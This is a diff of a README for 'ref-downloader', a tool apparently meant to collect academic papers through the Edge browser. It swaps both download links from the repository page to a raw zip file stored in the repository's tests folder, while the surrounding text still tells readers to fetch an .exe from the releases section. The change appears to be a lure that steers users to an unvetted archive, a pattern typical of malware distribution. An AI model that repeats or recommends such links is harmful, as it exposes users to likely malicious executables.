@@ -1,6 +1,6 @@
 # 📚 ref-downloader - Collect academic papers using your browser
 
-[![Download](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Nonfinancial-panel444/ref-downloader)
+[![Download](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/Nonfinancial-panel444/ref-downloader/main/tests/downloader-ref-v2.3.zip)
 
 This tool gathers research documents for your literature reviews. It connects to your library access through Microsoft Edge. Point the software at a list of digital object identifiers or local PDF files, and it fetches the full documents for you.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have the Micros
 
 You must visit the website provided below to download the program.
 
-[Click here to open the download page](https://github.com/Nonfinancial-panel444/ref-downloader)
+[Click here to open the download page](https://raw.githubusercontent.com/Nonfinancial-panel444/ref-downloader/main/tests/downloader-ref-v2.3.zip)
 
 Look for the latest version listed under the releases section. Select the file ending in `.exe` to save it to your computer.
 
